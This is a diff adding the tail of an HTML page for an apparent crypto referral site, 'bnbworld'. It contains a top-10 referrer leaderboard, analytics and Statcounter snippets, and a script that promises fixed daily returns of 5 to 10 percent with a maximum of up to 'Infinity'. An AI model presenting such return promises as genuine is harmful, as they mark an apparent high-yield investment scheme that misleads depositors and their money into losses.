+                      <div class="val"><a data-fancybox="" data-src="#stat" href="#" class="btn btn-bordered">Wallet
+                          Section</a>
+                      </div>
+                    </div>
+                    <div class="table-row">
+                      <div class="label">We have also many banner sizes available here</div>
+                      <div class="val"><a data-fancybox="" data-src="#promo" href="#" class="btn btn-bordered">Promo</a>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="block">
+                <div class="modal-content">
+                  <h4>Top 10 Referral addresses</h4>
+                  <div class="witems">
+                    <div class="witem">
+                      <div class="witem-content">
+                        1St Place
+                        <div class="witem-title "><span>address…</span>
+                        </div>
+                      </div>
+                      <div class="witem-opts">New Active referrals <strong>24</strong>
+                      </div>
+                    </div>
+                    <div class="witem">
+                      <div class="witem-content">
+                        2nd Place
+                        <div class="witem-title "><span>address…</span>
+                        </div>
+                      </div>
+                      <div class="witem-opts">New Active referrals <strong>24</strong>
+                      </div>
+                    </div>
+                    <div class="witem">
+                      <div class="witem-content">
+                        3rd Place
+                        <div class="witem-title "><span>address…</span>
+                        </div>
+                      </div>
+                      <div class="witem-opts">New Active referrals <strong>24</strong>
+                      </div>
+                    </div>
+                    <div class="witem">
+                      <div class="witem-content">
+                        4th Place
+                        <div class="witem-title "><span>address…</span>
+                        </div>
+                      </div>
+                      <div class="witem-opts">New Active referrals <strong>24</strong>
+                      </div>
+                    </div>
+                    <div class="witem">
+                      <div class="witem-content">
+                        5th Place
+                        <div class="witem-title "><span>address…</span>
+                        </div>
+                      </div>
+                      <div class="witem-opts">New Active referrals <strong>24</strong>
+                      </div>
+                    </div>
+                    <div class="witem">
+                      <div class="witem-content">
+                        6th Place
+                        <div class="witem-title "><span>address…</span>
+                        </div>
+                      </div>
+                      <div class="witem-opts">New Active referrals <strong>24</strong>
+                      </div>
+                    </div>
+                    <div class="witem">
+                      <div class="witem-content">
+                        7th Place
+                        <div class="witem-title "><span>address…</span>
+                        </div>
+                      </div>
+                      <div class="witem-opts">New Active referrals <strong>24</strong>
+                      </div>
+                    </div>
+                    <div class="witem">
+                      <div class="witem-content">
+                        8th Place
+                        <div class="witem-title "><span>address…</span>
+                        </div>
+                      </div>
+                      <div class="witem-opts">New Active referrals <strong>24</strong>
+                      </div>
+                    </div>
+                    <div class="witem">
+                      <div class="witem-content">
+                        9th Place
+                        <div class="witem-title "><span>address…</span>
+                        </div>
+                      </div>
+                      <div class="witem-opts">New Active referrals <strong>24</strong>
+                      </div>
+                    </div>
+                    <div class="witem">
+                      <div class="witem-content">
+                        10th Place
+                        <div class="witem-title "><span>address…</span>
+                        </div>
+                      </div>
+                      <div class="witem-opts">New Active referrals <strong>24</strong>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- #contest -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <!-- #contest -->
+  <!-- MODALS END -->
+  <div class="js-current-upline" data-account="0x0000000000000000000000000000000000000000"></div>
+  <script src="libs/svg4everybody/svg4everybody.min9e92.js"></script>
+  <script src="libs/simple-scroll/simplebar9e92.js"></script>
+  <script src="libs/prism/prism9e92.js"></script>
+  <script src="libs/Any-Content-Pagination-Plugin-For-jQuery-paginga/paginga.jquery.min9e92.js"></script>
+
+  <script src="js/common0646.js"></script>
+  <!--  <script src="bundle790f.js?v=2.0.1"></script> -->
+
+  <script src="gh/ethereum/web3.js@1.2.6/dist/web3.min.js"></script>
+  <script src="bnbworldjsv6.js"></script>
+  <script>
+    let url = "https://api.1inch.exchange/v3.0/1/tokens";
+    $.get(url, function (data) {
+      console.log(data);
+    });
+  </script>
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async="" src="gtag/js.js"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() { dataLayer.push(arguments); }
+    gtag('js', new Date());
+
+    gtag('config', 'G-3ECZEJ3X7Y');
+  </script>
+  <script>
+    function calculateAmount(val) {
+      var amt = $("#amt").val();
+      if (val == "hen") {
+        $("#daily").html("5%");
+        $("#dailybnb").html(amt * 5 / 100);
+        $("#max").html("Infinity");
+      }
+      else if (val == "cow") {
+        $("#daily").html("7.5%");
+        $("#dailybnb").html(amt * 7.5 / 100);
+        $("#max").html("225%");
+      }
+      else {
+        $("#daily").html("10%");
+        $("#dailybnb").html(amt * 10 / 100);
+        $("#max").html("200%");
+      }
+
+    }
+  </script>
+  <!-- Default Statcounter code for bnbworld http://bnbworld.org
+-->
+  <script type="text/javascript">
+    var sc_project = 12669159;
+    var sc_invisible = 1;
+    var sc_security = "d653def4"; 
+  </script>
+  <script type="text/javascript" src="counter/counter.js" async=""></script>
+  <noscript>
+    <div class="statcounter"><a title="free hit
+counter" href="index-2.htm" target="_blank"><img class="statcounter" src="12669159/0/d653def4/1/index.htm.gif"
+          alt="free hit counter" referrerpolicy="no-referrer-when-downgrade"></a></div>
+  </noscript>
+  <!-- End of Statcounter Code -->
+
+
+
+
+
+
+
+
+
+
+</body>
+
+</html>
